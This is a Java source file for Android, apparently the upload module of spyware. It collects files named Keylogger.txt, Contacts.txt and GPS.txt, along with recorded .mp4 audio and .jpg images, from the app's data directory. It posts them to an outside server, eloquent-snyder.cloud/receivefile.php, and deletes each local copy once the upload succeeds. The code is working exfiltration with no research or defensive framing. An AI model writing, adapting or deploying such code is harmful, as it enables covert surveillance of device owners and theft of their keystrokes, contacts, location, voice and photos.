package com.example.project;

import android.util.Log;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class okHTTP3 {
    OkHttpClient audioclient = new OkHttpClient();
    OkHttpClient gpsclient = new OkHttpClient();
    OkHttpClient contactclient = new OkHttpClient();
    OkHttpClient keyloggerclient = new OkHttpClient();
    OkHttpClient imageclient = new OkHttpClient();

    final static String DIRECTORY_PATH = "/data/data/com.example.project/";
    final static String URL = "https://eloquent-snyder.cloud/receivefile.php";

    public void sendAudio(){
        File[] fileArr = new File(DIRECTORY_PATH).listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File dir, String name) {
                return name.endsWith(".mp4");
            }
        });

        if (fileArr != null && fileArr.length != 0) {
            MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
            for (File file : fileArr) {
                MediaType mediaType = MediaType.parse("audio/mp4");
                RequestBody fileBody = RequestBody.create(mediaType, file);
                builder.addFormDataPart("file", file.getName(), fileBody);
            }

            MultipartBody multipartBody = builder.build();
            if (multipartBody.parts().isEmpty()) {
                return;
            }

            Request request = new Request.Builder()
                    .url(URL)
                    .post(multipartBody)
                    .build();

            audioclient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (!response.isSuccessful()) {
                        throw new IOException("Unexpected code " + response);
                    }
                    for (File file : fileArr) {
                        file.delete();
                    }
                }
            });
        } else {
            return;
        }
    }

    public void sendTextandImage(){
        String filePath = DIRECTORY_PATH + "Keylogger.txt";
        String filePath1 = DIRECTORY_PATH + "Contacts.txt";
        String filePath2 = DIRECTORY_PATH + "GPS.txt";

        File file = new File(filePath);
        File file1 = new File(filePath1);
        File file2 = new File(filePath2);
        File[] fileArr = new File(DIRECTORY_PATH).listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File dir, String name) {
                return name.endsWith(".jpg");
            }
        });

        if (fileArr != null && fileArr.length != 0) {
            MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
            for (File file3 : fileArr) {
                MediaType mediaType = MediaType.parse("image/jpeg");
                RequestBody fileBody3 = RequestBody.create(mediaType, file3);
                builder.addFormDataPart("file", file3.getName(), fileBody3);
            }

            MultipartBody multipartBody3 = builder.build();
            if (multipartBody3.parts().isEmpty()) {
                return;
            }

            Request request3 = new Request.Builder()
                    .url(URL)
                    .post(multipartBody3)
                    .build();

            imageclient.newCall(request3).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (!response.isSuccessful()) {
                        throw new IOException("Unexpected code " + response);
                    }
                    for (File file3 : fileArr) {
                        file3.delete();
                    }
                }
            });
        } else {
            return;
        }

        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
        RequestBody fileBody1 = RequestBody.create(MediaType.parse("application/octet-stream"), file1);
        RequestBody fileBody2 = RequestBody.create(MediaType.parse("application/octet-stream"), file2);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), fileBody)
                .build();
        RequestBody requestBody1 = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file1.getName(), fileBody1)
                .build();
        RequestBody requestBody2 = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file2.getName(), fileBody2)
                .build();

        Request request = new Request.Builder()
                .url(URL)
                .post(requestBody)
                .build();
        Request request1 = new Request.Builder()
                .url(URL)
                .post(requestBody1)
                .build();
        Request request2 = new Request.Builder()
                .url(URL)
                .post(requestBody2)
                .build();

        keyloggerclient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    throw new IOException("Unexpected code " + response);
                }
                file.delete();
            }
        });
        contactclient.newCall(request1).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    throw new IOException("Unexpected code " + response);
                }
                file1.delete();
            }
        });
        gpsclient.newCall(request2).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    throw new IOException("Unexpected code " + response);
                }
                file2.delete();
            }
        });
    }
}
